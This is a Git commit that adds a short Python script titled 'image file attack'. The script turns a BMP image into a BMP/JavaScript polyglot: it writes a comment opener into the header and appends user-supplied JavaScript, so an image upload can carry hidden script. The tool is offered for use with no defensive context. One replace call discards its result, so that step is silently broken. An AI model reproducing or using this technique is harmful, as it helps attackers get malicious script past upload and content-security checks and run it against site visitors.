8785e5d07c7e80242054ea83de22302b0fdd52d5
KongLingchong <121987793+KongLingchong@users.noreply.github.com>
2023-01-11 10:17:45 +0800

    Add files via upload

---
+++ 图片文件攻击.py
@@ -0,0 +1,18 @@
+fname = input("图片绝对路径：")   #图片文件路径（仅bmp文件）
+pfile = open(fname,"r+b")
+buff = pfile.read()
+buff.replace(b'\x2A\x2F',b'\x00\x00')
+pfile.close()
+pfile = open(fname,"w+b")
+pfile.write(buff)
+pfile.seek(2,0)
+pfile.write(b'\x2F\x2A')
+pfile.close()
+pfile = open(fname,"ab")
+pfile.write(b'\xFF\x2A\x2F\x3D\x31\x3B')
+c = input("插入的代码（仅JS）：")
+with open("a.js","w",encoding = "UTF-8") as file:
+    file.write(c)
+pfile.write(open("a.js","rb").read())
+pfile.close()
+print("插入成功")
